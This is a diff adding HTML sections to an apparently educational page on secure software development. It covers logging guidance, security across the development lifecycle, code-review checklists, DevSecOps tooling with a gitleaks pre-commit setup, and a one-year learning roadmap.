+        <a class="rl" href="https://github.com/dependabot" target="_blank"><span class="ri">🤖</span><span class="rt">GitHub Dependabot — automatic CVE alert PRs</span><span class="ra">↗</span></a>
+        <a class="rl" href="https://osv.dev/" target="_blank"><span class="ri">🌐</span><span class="rt">OSV.dev — open vulnerability database by Google</span><span class="ra">↗</span></a>
+      </div>
+    </div>
+
+    <div class="card c-skill">
+      <div class="ct">
+        <div class="ch"><div class="ci">📋</div><div><div class="cn">Secure Logging &amp; Error Handling</div><div class="cs">What to log, what never to expose</div></div></div>
+        <div class="lv lv2">Core Skill</div>
+        <p class="cd">Logs are your only forensic evidence after an incident — but they can also <strong>leak sensitive data</strong> to aggregators, developers, and attackers. Error messages must shield internal state. The goal: log enough to detect and investigate breaches, while never logging what you shouldn't.</p>
+      </div>
+      <div class="cklist">
+        <div class="cki"><div class="dot">✓</div><strong>Log:</strong> auth events (success + failure + IP), access denied, privilege changes, data modifications, config changes, validation failures</div>
+        <div class="cki"><div class="dot">✓</div><strong>Include per event:</strong> timestamp, user ID, IP, action, resource, outcome, correlation ID</div>
+        <div class="cki"><div class="dot">✗</div><strong>Never log:</strong> passwords, session tokens, credit cards, API keys, SSNs, health data</div>
+        <div class="cki"><div class="dot">✓</div><strong>Error handling:</strong> return generic message to client + reference ID; log full detail internally</div>
+        <div class="cki"><div class="dot">✓</div><strong>Log protection:</strong> ship to separate write-only SIEM — attackers must not be able to delete them</div>
+      </div>
+      <div class="res">
+        <div class="res-label">Reference</div>
+        <a class="rl" href="https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html" target="_blank"><span class="ri">📘</span><span class="rt">OWASP Logging Cheat Sheet</span><span class="ra">↗</span></a>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+
+<!-- ═══════════════════════════════════════════════ -->
+<!-- PANEL 4 — PROCESS                             -->
+<!-- ═══════════════════════════════════════════════ -->
+<div class="panel c-proc" id="p3">
+  <div class="ph c-proc" data-bg="PROC">
+    <div class="ph-tag">04 · Security in Your SDLC</div>
+    <h2>Security Across the Development Lifecycle</h2>
+    <p>A secure developer doesn't just write secure code — they participate in <strong>security activities at every stage of the development lifecycle</strong>. This is what OWASP SAMM, NIST SSDF, and Microsoft SDL all describe: security embedded in requirements, design, implementation, testing, and operations. Security in process is what scales beyond individual heroics.</p>
+    <div class="ph-pills"><span class="ph-pill">NIST SSDF</span><span class="ph-pill">OWASP SAMM</span><span class="ph-pill">Microsoft SDL</span><span class="ph-pill">Requirements</span><span class="ph-pill">Design</span><span class="ph-pill">Review</span><span class="ph-pill">Testing</span></div>
+  </div>
+
+  <div class="flow-box c-proc">
+    <h3>🔄 Security Activities Mapped to the SDLC (based on NIST SSDF + Microsoft SDL)</h3>
+    <div class="flow">
+      <div class="fs"><div class="fn">1</div><div class="fb"><h4>Requirements &amp; Planning</h4><p>Elicit <strong>security requirements</strong> alongside functional ones. Ask: what data is sensitive? who needs access? what are the regulatory obligations? Define <code>abuse cases</code> alongside use cases. Specify security acceptance criteria before the feature is designed. Output: security requirements in the backlog with DoD.</p></div></div>
+      <div class="fs"><div class="fn">2</div><div class="fb"><h4>Architecture &amp; Design — Threat Modeling</h4><p>Run a <strong>threat modeling session</strong> before significant features or architecture changes. Draw Data Flow Diagrams, identify trust boundaries, apply STRIDE to every element. <code>4 questions:</code> What are we building → What can go wrong → What do we do about it → Did we do a good job? Output: threats + mitigations added to backlog.</p></div></div>
+      <div class="fs"><div class="fn">3</div><div class="fb"><h4>Implementation — Secure Coding + Self-Review</h4><p>Apply secure coding skills (panel 03) every day. Before submitting a PR, <strong>review your own code with a security lens</strong>: are there injection points? are all access checks in place? are secrets handled correctly? Run SAST locally. Use the security checklist below as a guide.</p></div></div>
+      <div class="fs"><div class="fn">4</div><div class="fb"><h4>Code Review — Security-Focused Peer Review</h4><p>When reviewing others' code, <strong>actively look for security issues</strong> — not just correctness and style. Make one focused pass per category: access control → injection → secrets → error handling. A reviewer who catches an injection bug saves weeks of remediation. Use the review checklist below.</p></div></div>
+      <div class="fs"><div class="fn">5</div><div class="fb"><h4>CI/CD — Automated Security Gates</h4><p>Run automated security tests in every pipeline: <strong>SAST</strong> (static code analysis), <strong>SCA</strong> (dependency CVEs), <strong>secrets scanning</strong>, and <strong>IaC scanning</strong>. Block on CRITICAL findings. DAST runs against staging before production. Every developer sees security findings immediately — not weeks later.</p></div></div>
+      <div class="fs"><div class="fn">6</div><div class="fb"><h4>Deployment — Secure Configuration &amp; IaC</h4><p>Secure configuration is a <strong>developer responsibility</strong>. Review IaC (Terraform, Kubernetes manifests, Dockerfile) for security issues. Use secrets managers — never hardcode in deployment configs. Apply least privilege to service accounts and IAM roles. Enforce network policies.</p></div></div>
+      <div class="fs"><div class="fn">7</div><div class="fb"><h4>Operations — Monitor, Respond, Patch</h4><p>Know what your application logs and what it alerts on. Participate in on-call for security incidents. When a CVE is published for a dependency you use, act immediately based on your patch SLA. Conduct post-mortems on security bugs — <strong>understand the root cause and prevent recurrence</strong>.</p></div></div>
+    </div>
+  </div>
+
+  <div class="sec">Security Code Review — Focused Checklists</div>
+  <div class="grid grid2">
+    <div class="card c-proc">
+      <div class="ct">
+        <div class="ch"><div class="ci">🔐</div><div><div class="cn">Access Control Review</div><div class="cs">OWASP A01 — the #1 missed category</div></div></div>
+        <p class="cd">The most common missed category in code review. For every new endpoint or data operation, ask these questions systematically.</p>
+      </div>
+      <div class="cklist">
+        <div class="cki"><div class="dot">?</div>Can this endpoint be reached without authentication?</div>
+        <div class="cki"><div class="dot">?</div>Does the code verify this user can access <strong>this specific resource</strong> (not just "is logged in")?</div>
+        <div class="cki"><div class="dot">?</div>Is the check on the server — or only in the UI/client?</div>
+        <div class="cki"><div class="dot">?</div>Can a regular user reach admin functionality by changing a parameter?</div>
+        <div class="cki"><div class="dot">?</div>Can user A access user B's data by manipulating an ID in the URL or request body?</div>
+      </div>
+    </div>
+    <div class="card c-proc">
+      <div class="ct">
+        <div class="ch"><div class="ci">💉</div><div><div class="cn">Injection Review</div><div class="cs">SQL, XSS, CMDi, Path Traversal, SSTI</div></div></div>
+        <p class="cd">Look for every place where <strong>user-controlled input flows into a structured output</strong>: database query, HTML, shell command, file path, template, LDAP, XML, log line.</p>
+      </div>
+      <div class="cklist">
+        <div class="cki"><div class="dot">?</div>Is user input concatenated into a SQL string rather than parameterized?</div>
+        <div class="cki"><div class="dot">?</div>Is user input written into HTML without context-aware encoding?</div>
+        <div class="cki"><div class="dot">?</div>Is user input passed to os.system(), exec(), eval(), subprocess with shell=True?</div>
+        <div class="cki"><div class="dot">?</div>Is user input used to construct a file path without canonicalization + boundary check?</div>
+        <div class="cki"><div class="dot">?</div>Is user input used as a template string (SSTI vulnerability)?</div>
+      </div>
+    </div>
+    <div class="card c-proc">
+      <div class="ct">
+        <div class="ch"><div class="ci">🔒</div><div><div class="cn">Secrets &amp; Crypto Review</div><div class="cs">Keys, algorithms, random, storage</div></div></div>
+        <p class="cd">Scan every PR for these patterns. They are easy to spot once you know what to look for.</p>
+      </div>
+      <div class="cklist">
+        <div class="cki"><div class="dot">?</div>Are there hardcoded passwords, API keys, tokens, or connection strings?</div>
+        <div class="cki"><div class="dot">?</div>Is MD5, SHA1, DES, or RC4 used anywhere?</div>
+        <div class="cki"><div class="dot">?</div>Is random() / Math.random() / time()-seeding used for security-sensitive values?</div>
+        <div class="cki"><div class="dot">?</div>Is AES used in ECB mode, or without an IV?</div>
+        <div class="cki"><div class="dot">?</div>Are secrets loaded from environment variables or a secrets manager (not config files)?</div>
+      </div>
+    </div>
+    <div class="card c-proc">
+      <div class="ct">
+        <div class="ch"><div class="ci">📡</div><div><div class="cn">Error Handling &amp; Logging Review</div><div class="cs">Information leakage, audit trail</div></div></div>
+        <p class="cd">Check that failures don't leak internal state and that security events are captured.</p>
+      </div>
+      <div class="cklist">
+        <div class="cki"><div class="dot">?</div>Are stack traces, SQL errors, or file paths returned to the client?</div>
+        <div class="cki"><div class="dot">?</div>Do different auth failure messages reveal whether the user exists?</div>
+        <div class="cki"><div class="dot">?</div>Are passwords, tokens, or card numbers being written to logs?</div>
+        <div class="cki"><div class="dot">?</div>Are authentication and authorization failures being logged with sufficient context?</div>
+        <div class="cki"><div class="dot">?</div>Is there a generic catch-all that returns True or grants access on error?</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="strip info">
+    <span class="si">ℹ️</span>
+    <div class="st"><strong>Review strategy:</strong> Don't try to find everything in one unfocused pass. Make one dedicated pass per concern: first access control, then injection, then secrets, then error handling. Focused attention per category catches more issues than a single scan. Use the checklists above as your guide — not as a replacement for reading the code carefully.</div>
+  </div>
+
+  <div class="toolbox c-proc">
+    <h3>🔧 Process & Methodology Tools</h3>
+    <div class="tool-row">
+      <a class="tp" href="https://owasp.org/www-project-code-review-guide/" target="_blank">OWASP Code Review Guide</a>
+      <a class="tp" href="https://owasp.org/www-project-application-security-verification-standard/" target="_blank">OWASP ASVS</a>
+      <a class="tp" href="https://owaspsamm.org/" target="_blank">OWASP SAMM</a>
+      <a class="tp" href="https://github.com/OWASP/threat-dragon" target="_blank">OWASP Threat Dragon</a>
+      <a class="tp" href="https://www.microsoft.com/en-us/securityengineering/sdl" target="_blank">Microsoft SDL</a>
+      <a class="tp" href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-218.pdf" target="_blank">NIST SSDF SP 800-218</a>
+      <a class="tp" href="https://owasp.org/www-project-web-security-testing-guide/" target="_blank">OWASP WSTG</a>
+    </div>
+  </div>
+</div>
+
+
+<!-- ═══════════════════════════════════════════════ -->
+<!-- PANEL 5 — TOOLING                             -->
+<!-- ═══════════════════════════════════════════════ -->
+<div class="panel c-tool" id="p4">
+  <div class="ph c-tool" data-bg="TOOL">
+    <div class="ph-tag">05 · DevSecOps Tooling</div>
+    <h2>Security Tools Every Developer Should Use</h2>
+    <p>Tools are not a substitute for knowledge — but they <strong>scale your effort and catch what your eyes miss</strong>. The right tools in your IDE, pre-commit hooks, and CI/CD pipeline catch issues before they reach production. Knowing how to <strong>interpret, triage, and act on</strong> tool findings is itself a skill that takes practice.</p>
+    <div class="ph-pills"><span class="ph-pill">SAST</span><span class="ph-pill">DAST</span><span class="ph-pill">SCA</span><span class="ph-pill">Secrets scanning</span><span class="ph-pill">Container security</span><span class="ph-pill">IaC scanning</span></div>
+  </div>
+
+  <div class="sec">Tool Categories</div>
+  <div class="grid">
+
+    <div class="card c-tool">
+      <div class="ct">
+        <div class="ch"><div class="ci">🔬</div><div><div class="cn">SAST — Static Application Security Testing</div><div class="cs">Analyze code without running it</div></div></div>
+        <div class="lv lv2">Run in IDE + CI/CD</div>
+        <p class="cd">SAST tools analyze source code for known vulnerability patterns — SQL injection, hardcoded credentials, unsafe deserialization, dangerous function usage. <strong>Run in IDE for real-time feedback</strong>, and in CI/CD to block CRITICAL findings before merge.</p>
+      </div>
+      <div class="cklist">
+        <div class="cki"><div class="dot">🐍</div><strong>Python:</strong> Bandit, Semgrep, SonarQube</div>
+        <div class="cki"><div class="dot">☕</div><strong>Java:</strong> SpotBugs + FindSecBugs, SonarQube, Checkmarx</div>
+        <div class="cki"><div class="dot">🌐</div><strong>JavaScript/TS:</strong> ESLint security plugins, Semgrep, NodeJsScan</div>
+        <div class="cki"><div class="dot">🦀</div><strong>Rust:</strong> cargo-audit, cargo-deny</div>
+        <div class="cki"><div class="dot">🐹</div><strong>Go:</strong> gosec, staticcheck</div>
+        <div class="cki"><div class="dot">🔷</div><strong>Multi-language:</strong> Semgrep (free), CodeQL (GitHub, free for OSS), Checkmarx</div>
+        <div class="cki"><div class="dot">⚠️</div>SAST has <strong>high false positive rates</strong> — learn to triage; don't ignore all findings</div>
+      </div>
+      <div class="res">
+        <div class="res-label">Start free</div>
+        <a class="rl" href="https://semgrep.dev/" target="_blank"><span class="ri">🔬</span><span class="rt">Semgrep — multi-language SAST, free tier + community rules</span><span class="ra">↗</span></a>
+        <a class="rl" href="https://codeql.github.com/" target="_blank"><span class="ri">🐙</span><span class="rt">GitHub CodeQL — free for open source repos</span><span class="ra">↗</span></a>
+      </div>
+    </div>
+
+    <div class="card c-tool">
+      <div class="ct">
+        <div class="ch"><div class="ci">🕷️</div><div><div class="cn">DAST — Dynamic Application Security Testing</div><div class="cs">Test the running application like an attacker</div></div></div>
+        <div class="lv lv2">Pre-release testing</div>
+        <p class="cd">DAST tools interact with a running application like a real attacker — sending crafted requests, fuzzing inputs, testing for injection and auth issues. They find runtime behavior that SAST misses: misconfigured headers, missing auth, actual injection exploitability.</p>
+      </div>
+      <div class="cklist">
+        <div class="cki"><div class="dot">🕷️</div><strong>OWASP ZAP:</strong> free, open source; excellent CI/CD integration via Docker</div>
+        <div class="cki"><div class="dot">🕷️</div><strong>Burp Suite Community:</strong> the industry standard for manual testing; free edition available</div>
+        <div class="cki"><div class="dot">🕷️</div><strong>Nikto:</strong> fast web server misconfiguration scanner</div>
+        <div class="cki"><div class="dot">📖</div>Use <strong>OWASP WSTG</strong> (Web Security Testing Guide) as your manual test checklist</div>
+        <div class="cki"><div class="dot">🤖</div>Automate ZAP in CI/CD against a staging environment before every production deploy</div>
+      </div>
+      <div class="res">
+        <div class="res-label">Start free</div>
+        <a class="rl" href="https://www.zaproxy.org/" target="_blank"><span class="ri">🕷️</span><span class="rt">OWASP ZAP — free DAST scanner with CI/CD support</span><span class="ra">↗</span></a>
+        <a class="rl" href="https://portswigger.net/burp/communitydownload" target="_blank"><span class="ri">🕷️</span><span class="rt">Burp Suite Community Edition (free)</span><span class="ra">↗</span></a>
+      </div>
+    </div>
+
+    <div class="card c-tool">
+      <div class="ct">
+        <div class="ch"><div class="ci">🧩</div><div><div class="cn">SCA — Software Composition Analysis</div><div class="cs">Find vulnerabilities in your dependencies</div></div></div>
+        <div class="lv lv1">Must Have in CI/CD</div>
+        <p class="cd">SCA tools scan your dependency tree against vulnerability databases (NVD, OSV, GitHub Advisory). Log4Shell, XZ Utils, and Heartbleed were all dependency attacks. <strong>Enable SCA in every project from day one.</strong></p>
+      </div>
+      <div class="cklist">
+        <div class="cki"><div class="dot">🤖</div><strong>Dependabot:</strong> GitHub-native; automatic CVE alert PRs — enable on every repo</div>
+        <div class="cki"><div class="dot">🔍</div><strong>OWASP Dependency-Check:</strong> multi-ecosystem, CI/CD-friendly, free</div>
+        <div class="cki"><div class="dot">🔍</div><strong>Trivy:</strong> containers + filesystems + git repos + IaC — very fast, free</div>
+        <div class="cki"><div class="dot">🔍</div><strong>Snyk:</strong> developer-focused with IDE plugin + CI/CD integration; free tier</div>
+        <div class="cki"><div class="dot">📋</div><strong>SBOM:</strong> generate with <strong>Syft</strong> or CycloneDX on every release artifact</div>
+      </div>
+      <div class="res">
+        <div class="res-label">Start free</div>
+        <a class="rl" href="https://github.com/aquasecurity/trivy" target="_blank"><span class="ri">🔍</span><span class="rt">Trivy — fastest comprehensive vulnerability scanner</span><span class="ra">↗</span></a>
+        <a class="rl" href="https://osv.dev/" target="_blank"><span class="ri">🌐</span><span class="rt">OSV.dev — Google's open vulnerability database</span><span class="ra">↗</span></a>
+      </div>
+    </div>
+
+    <div class="card c-tool">
+      <div class="ct">
+        <div class="ch"><div class="ci">🔑</div><div><div class="cn">Secrets Detection</div><div class="cs">Pre-commit hooks + CI/CD scanning</div></div></div>
+        <div class="lv lv1">Must Have · Day 1 Setup</div>
+        <p class="cd">Automatically detect secrets before they reach your repository. <strong>Install a pre-commit hook on every developer machine</strong> — this prevents secrets from ever entering git history. Also run in CI/CD as a second line of defense.</p>
+        <div class="codeblock">
+          <div class="cb-bar"><span class="cb-title">gitleaks pre-commit setup</span><span class="cb-lang">shell</span></div>
+          <pre><span class="m"># 1. Install pre-commit</span>
+<span class="g">pip install pre-commit</span>
+
+<span class="m"># 2. Create .pre-commit-config.yaml</span>
+repos:
+  - repo: https://github.com/gitleaks/gitleaks
+    rev: v8.18.0
+    hooks:
+      - id: gitleaks
+
+<span class="m"># 3. Install the hook</span>
+<span class="g">pre-commit install</span>
+<span class="m"># Every git commit is now scanned automatically</span></pre>
+        </div>
+      </div>
+      <div class="res">
+        <div class="res-label">Tools</div>
+        <a class="rl" href="https://github.com/gitleaks/gitleaks" target="_blank"><span class="ri">🔑</span><span class="rt">gitleaks — most widely-used secrets scanner</span><span class="ra">↗</span></a>
+        <a class="rl" href="https://pre-commit.com/" target="_blank"><span class="ri">🪝</span><span class="rt">pre-commit — framework for managing git hooks</span><span class="ra">↗</span></a>
+      </div>
+    </div>
+
+    <div class="card c-tool">
+      <div class="ct">
+        <div class="ch"><div class="ci">🐳</div><div><div class="cn">Container &amp; IaC Security Scanning</div><div class="cs">Secure the infrastructure you ship</div></div></div>
+        <div class="lv lv2">Core Skill</div>
+        <p class="cd">Containers and Infrastructure-as-Code (Terraform, Kubernetes, CloudFormation, Dockerfile) introduce their own misconfiguration risks. <strong>Scan before deploy</strong>: image vulnerabilities, overpermissive IAM, missing security contexts, exposed ports, secrets in environment variables.</p>
+      </div>
+      <div class="cklist">
+        <div class="cki"><div class="dot">🐳</div><strong>Trivy / Grype:</strong> scan Docker images for OS + language package CVEs</div>
+        <div class="cki"><div class="dot">☁️</div><strong>Checkov / tfsec:</strong> Terraform, CloudFormation, k8s manifests — free</div>
+        <div class="cki"><div class="dot">⎈</div><strong>kube-bench:</strong> Kubernetes CIS benchmark compliance checker</div>
+        <div class="cki"><div class="dot">🔐</div>Never run containers as root — set non-root <code>USER</code> in every Dockerfile</div>
+        <div class="cki"><div class="dot">📦</div>Use minimal base images (distroless, alpine) — less surface area = fewer CVEs</div>
+        <div class="cki"><div class="dot">🔒</div>Set <code>readOnlyRootFilesystem: true</code> and <code>allowPrivilegeEscalation: false</code> in k8s</div>
+      </div>
+      <div class="res">
+        <div class="res-label">Tools</div>
+        <a class="rl" href="https://www.checkov.io/" target="_blank"><span class="ri">☁️</span><span class="rt">Checkov — IaC security scanner (free)</span><span class="ra">↗</span></a>
+        <a class="rl" href="https://github.com/aquasecurity/trivy" target="_blank"><span class="ri">🐳</span><span class="rt">Trivy — container + IaC vulnerability scanner</span><span class="ra">↗</span></a>
+      </div>
+    </div>
+
+    <div class="card c-tool">
+      <div class="ct">
+        <div class="ch"><div class="ci">⚙️</div><div><div class="cn">DevSecOps Pipeline — Target Architecture</div><div class="cs">Security as code in every commit</div></div></div>
+        <div class="lv lv2">Target State</div>
+        <p class="cd">The goal is <strong>security gates in every CI/CD pipeline run</strong> — not manual checks before quarterly releases. Developers get immediate feedback. Security findings become just another category of failing test. This is what NIST SSDF and OWASP SAMM describe as the target DevSecOps posture.</p>
+        <div class="codeblock">
+          <div class="cb-bar"><span class="cb-title">Target CI/CD Security Pipeline</span></div>
+          <pre><span class="b">git push</span>
+  ↓ <span class="m">[pre-commit]</span>   gitleaks + lint
+  ↓ <span class="m">[build]</span>
+  ↓ <span class="m">[SAST]</span>        semgrep / codeql  → <span class="r">block CRITICAL</span>
+  ↓ <span class="m">[SCA]</span>         trivy / dependabot → <span class="r">block CRITICAL CVE</span>
+  ↓ <span class="m">[IaC]</span>         checkov            → <span class="r">block HIGH misconfig</span>
+  ↓ <span class="m">[secrets]</span>     gitleaks in CI     → <span class="r">block always</span>
+  ↓ <span class="m">[DAST]</span>        zap vs staging     → <span class="y">alert on HIGH</span>
+  ↓ <span class="m">[sign]</span>        cosign sign image
+  ↓ <span class="g">deploy to production</span></pre>
+        </div>
+      </div>
+      <div class="res">
+        <div class="res-label">References</div>
+        <a class="rl" href="https://owasp.org/www-project-devsecops-guideline/" target="_blank"><span class="ri">📘</span><span class="rt">OWASP DevSecOps Guideline</span><span class="ra">↗</span></a>
+        <a class="rl" href="https://slsa.dev/" target="_blank"><span class="ri">🔗</span><span class="rt">SLSA Framework — supply chain security levels</span><span class="ra">↗</span></a>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+
+<!-- ═══════════════════════════════════════════════ -->
+<!-- PANEL 6 — GROWTH & CULTURE                    -->
+<!-- ═══════════════════════════════════════════════ -->
+<div class="panel c-grow" id="p5">
+  <div class="ph c-grow" data-bg="GROW">
+    <div class="ph-tag">06 · Culture &amp; Continuous Growth</div>
+    <h2>Building Habits &amp; Growing Continuously</h2>
+    <p>Security is not a certification you obtain once — it is a <strong>continuous practice in a constantly evolving threat landscape</strong>. New vulnerabilities are published daily. New attack techniques emerge. New frameworks introduce new vulnerability classes. The final step is building sustainable habits, contributing to your team's security culture, and staying current over time.</p>
+    <div class="ph-pills"><span class="ph-pill">Security champion</span><span class="ph-pill">Learning path</span><span class="ph-pill">Staying current</span><span class="ph-pill">Self-assessment</span></div>
+  </div>
+
+  <div class="sec">Your Learning Roadmap — Regular → Secure Developer</div>
+  <div class="roadmap">
+    <div class="rm-card c-grow">
+      <div class="rm-phase">Month 1–2 · Fundamentals</div>
+      <div class="rm-title">Build the Knowledge Base</div>
+      <div class="rm-items">
+        <div class="rm-item">Complete <strong>PortSwigger Web Security Academy</strong> (free) — do the labs, not just the reading</div>
+        <div class="rm-item">Read the <strong>OWASP Top 10</strong> and understand each category with examples</div>
+        <div class="rm-item">Attack <strong>OWASP Juice Shop</strong> — deliberately vulnerable app to exploit and learn from</div>
+        <div class="rm-item">Set up <strong>gitleaks pre-commit</strong> on all your repos this week</div>
+        <div class="rm-item">Enable <strong>Dependabot</strong> on your GitHub repositories</div>
+      </div>
+    </div>
+    <div class="rm-card c-grow">
+      <div class="rm-phase">Month 3–4 · Practice</div>
+      <div class="rm-title">Apply to Your Own Code</div>
+      <div class="rm-items">
+        <div class="rm-item">Run <strong>Semgrep or Bandit</strong> on your current project — triage every finding</div>
+        <div class="rm-item">Run <strong>Trivy</strong> on your Docker images and fix what you find</div>
+        <div class="rm-item">Review one older feature or API with the <strong>security code review checklists</strong> from panel 04</div>
+        <div class="rm-item">Run your <strong>first threat modeling session</strong> on an upcoming feature — even 30 minutes on a whiteboard</div>
+        <div class="rm-item">Fix the top 3 security issues you find in your own code before anything else</div>
+      </div>
+    </div>
+    <div class="rm-card c-grow">
+      <div class="rm-phase">Month 5–8 · Depth</div>
+      <div class="rm-title">Deepen the Skills</div>
+      <div class="rm-items">
+        <div class="rm-item">Study the <strong>three reference sites</strong> in this series (Vulnerabilities, Cryptography, Secure Design Patterns)</div>
+        <div class="rm-item">Implement a proper authentication system using a library — with MFA, rate limiting, audit log</div>
+        <div class="rm-item">Set up the <strong>full DevSecOps pipeline</strong> (panel 05 target architecture) on your main project</div>
+        <div class="rm-item">Facilitate a threat modeling session with your team — not just solo</div>
+        <div class="rm-item">Start reading CVE disclosures for frameworks you use — understand <em>why</em> each was vulnerable</div>
+      </div>
+    </div>
+    <div class="rm-card c-grow">
+      <div class="rm-phase">Month 9–12 · Champion</div>
+      <div class="rm-title">Become a Security Champion</div>
+      <div class="rm-items">
+        <div class="rm-item">Take on the <strong>Security Champion</strong> role in your team — bridge between dev and security</div>
+        <div class="rm-item">Mentor teammates on secure coding — code review with a security lens</div>
+        <div class="rm-item">Drive security requirements into sprint planning as a standard part of the process</div>
+        <div class="rm-item">Run a "security retrospective" — what security bugs did we ship last quarter, and why?</div>
+        <div class="rm-item">Consider a certification: <strong>eWPTX, GWEB</strong>, or pursue CSSLP</div>
+      </div>
+    </div>
+    <div class="rm-card c-grow">
+      <div class="rm-phase">Year 2+ · Expert</div>
+      <div class="rm-title">Sustain and Grow</div>
+      <div class="rm-items">
+        <div class="rm-item">Pursue formal certifications: <strong>CSSLP, OSCP</strong>, cloud security specialty</div>
+        <div class="rm-item">Participate in a <strong>bug bounty program</strong> — HackerOne, Bugcrowd (builds deep attacker intuition)</div>
+        <div class="rm-item">Contribute to <strong>OWASP</strong> projects or local chapter</div>
+        <div class="rm-item">Train new developers on your team — teaching deepens your own understanding</div>
+        <div class="rm-item">Stay current: follow CVE disclosures, Google Project Zero blog, security conferences</div>
+      </div>
+    </div>
+    <div class="rm-card c-grow">
+      <div class="rm-phase">Ongoing · Habits</div>
+      <div class="rm-title">Daily &amp; Weekly Security Habits</div>
+      <div class="rm-items">
+        <div class="rm-item"><strong>Every PR:</strong> 5-minute security self-review with the checklist</div>
+        <div class="rm-item"><strong>Weekly:</strong> check CVE alerts for your key dependencies</div>
+        <div class="rm-item"><strong>Weekly:</strong> read 1–2 security write-ups or vulnerability disclosures</div>
+        <div class="rm-item"><strong>Monthly:</strong> one CTF challenge — even easy ones build attacker intuition</div>
+        <div class="rm-item"><strong>Every feature:</strong> write an abuse case alongside each use case</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="sec">The Security Champion Role</div>
+  <div class="grid">
+    <div class="card c-grow">
+      <div class="ct">
+        <div class="ch"><div class="ci">🏆</div><div><div class="cn">Becoming a Security Champion</div><div class="cs">Bridge between dev team and security</div></div></div>
+        <p class="cd">A <strong>Security Champion</strong> is a developer who takes on extra responsibility for security within their team — not a full-time security professional, but the person who bridges the gap. Research shows teams with a champion find 50%+ more vulnerabilities before production.</p>
+      </div>
+      <div class="kp">
+        <div class="kp-title">What a Security Champion Does</div>
+        <div class="kp-items">
+          <div class="kp-item">Facilitates threat modeling sessions for new features</div>
+          <div class="kp-item">Reviews PRs with a security lens and mentors teammates on findings</div>
+          <div class="kp-item">Is the first point of contact for security questions in the team</div>
+          <div class="kp-item">Keeps the team informed about new CVEs in your stack</div>
+          <div class="kp-item">Advocates for security time in sprint planning</div>
+          <div class="kp-item">Participates in incident response and security post-mortems</div>
+          <div class="kp-item">Evaluates and introduces new security tools to the team</div>
+        </div>
+      </div>
+      <div class="res">
+        <div class="res-label">Reference</div>
+        <a class="rl" href="https://owasp.org/www-project-security-champions-guidebook/" target="_blank"><span class="ri">📘</span><span class="rt">OWASP Security Champions Guidebook</span><span class="ra">↗</span></a>
+      </div>
+    </div>
+
+    <div class="card c-grow">
+      <div class="ct">
+        <div class="ch"><div class="ci">🌐</div><div><div class="cn">Staying Current</div><div class="cs">The threat landscape never stops evolving</div></div></div>
+        <p class="cd">New vulnerabilities emerge constantly. You don't need to read every security blog — you need a <strong>minimum viable awareness practice</strong> that keeps you informed about threats relevant to your stack without becoming overwhelming.</p>
+      </div>
+      <div class="cklist">
+        <div class="cki"><div class="dot">📡</div>Subscribe to CVE alerts for your key dependencies (GitHub, OSV.dev, NVD email)</div>
+        <div class="cki"><div class="dot">📰</div>Follow Google Project Zero blog and your framework's security advisories</div>
+        <div class="cki"><div class="dot">🧪</div>Monthly CTF challenge — HackTheBox, TryHackMe, or PortSwigger labs</div>
+        <div class="cki"><div class="dot">🏅</div>When a major CVE hits: read the write-up, understand <em>why</em> it was vulnerable, check your code</div>
+        <div class="cki"><div class="dot">🤝</div>Join OWASP local chapter — Breda/Den Haag/Amsterdam all have active chapters</div>
+      </div>
+      <div class="res">
+        <div class="res-label">Stay current</div>
+        <a class="rl" href="https://googleprojectzero.blogspot.com/" target="_blank"><span class="ri">🔵</span><span class="rt">Google Project Zero Blog — deep technical research</span><span class="ra">↗</span></a>
+        <a class="rl" href="https://nvd.nist.gov/vuln/search" target="_blank"><span class="ri">🏛️</span><span class="rt">NVD — National Vulnerability Database</span><span class="ra">↗</span></a>
+        <a class="rl" href="https://owasp.org/chapters/" target="_blank"><span class="ri">🌐</span><span class="rt">OWASP Local Chapters (Netherlands)</span><span class="ra">↗</span></a>
+      </div>
+    </div>
+  </div>
+
+  <div class="sec">Self-Assessment — Where Am I on the Journey?</div>
+  <div class="radar c-grow">
+    <h3>📊 Developer Security Skills Self-Assessment</h3>
+    <div class="rdesc">Rate yourself honestly by clicking each bar. The goal is not max in everything — it is knowing where you are and what to focus on next. Focus on the lowest-scoring areas first. A broad foundation matters more than depth in one area.</div>
+
+    <div class="sb-row"><div class="sb-label">Security mindset / adversarial thinking</div><div class="sb-cat">MINDSET</div><div class="sb-track" data-color="var(--c-mind)"><div class="sb-fill" style="background:var(--c-mind)"></div></div><div class="sb-val">— click to rate —</div></div>
+    <div class="sb-row"><div class="sb-label">OWASP Top 10 knowledge</div><div class="sb-cat">KNOWLEDGE</div><div class="sb-track" data-color="var(--c-know)"><div class="sb-fill" style="background:var(--c-know)"></div></div><div class="sb-val">— click to rate —</div></div>
+    <div class="sb-row"><div class="sb-label">Threat modeling ability</div><div class="sb-cat">KNOWLEDGE</div><div class="sb-track" data-color="var(--c-know)"><div class="sb-fill" style="background:var(--c-know)"></div></div><div class="sb-val">— click to rate —</div></div>
+    <div class="sb-row"><div class="sb-label">Injection prevention in daily coding</div><div class="sb-cat">CODING</div><div class="sb-track" data-color="var(--c-skill)"><div class="sb-fill" style="background:var(--c-skill)"></div></div><div class="sb-val">— click to rate —</div></div>
+    <div class="sb-row"><div class="sb-label">Authentication &amp; session management</div><div class="sb-cat">CODING</div><div class="sb-track" data-color="var(--c-skill)"><div class="sb-fill" style="background:var(--c-skill)"></div></div><div class="sb-val">— click to rate —</div></div>
+    <div class="sb-row"><div class="sb-label">Applied cryptography choices</div><div class="sb-cat">CODING</div><div class="sb-track" data-color="var(--c-skill)"><div class="sb-fill" style="background:var(--c-skill)"></div></div><div class="sb-val">— click to rate —</div></div>
+    <div class="sb-row"><div class="sb-label">Secrets management practice</div><div class="sb-cat">CODING</div><div class="sb-track" data-color="var(--c-skill)"><div class="sb-fill" style="background:var(--c-skill)"></div></div><div class="sb-val">— click to rate —</div></div>
+    <div class="sb-row"><div class="sb-label">Security in code review</div><div class="sb-cat">PROCESS</div><div class="sb-track" data-color="var(--c-proc)"><div class="sb-fill" style="background:var(--c-proc)"></div></div><div class="sb-val">— click to rate —</div></div>
